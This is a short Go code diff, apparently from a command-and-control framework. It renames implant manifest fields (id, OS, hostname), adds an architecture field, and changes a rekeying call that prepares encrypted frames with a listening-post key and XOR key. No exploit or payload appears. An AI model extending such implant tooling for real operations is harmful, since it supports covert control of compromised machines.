@@ -26,13 +26,14 @@ type Component struct {
 }
 
 type ComponentManifest struct {
-	Implant_id       string
-	Implant_os       string
-	Implant_hostname string
+	Id       string
+	Os       string
+	Hostname string
+	Arch     string
 }
 
 func Rekey(frame instructions.Transaction, component Component) (Component, []byte, asymmetric.AsymmetricKeyPair) {
-	rawRekeyFrame := instructions.CreateInstructionFrame(frame)
+	rawRekeyFrame := instructions.CreateInstructionFrame(frame, true)
 	rawFrameBytes := new(bytes.Buffer)
 	json.NewEncoder(rawFrameBytes).Encode(rawRekeyFrame)
 	rekeyFrame, newComponentKeypair := routine.PrepareTransmitFrame(rawFrameBytes.Bytes(), component.Config.CryptoConfig.LpPk, component.CurrentKeypair.PrivKey, component.Config.CryptoConfig.XorKey)
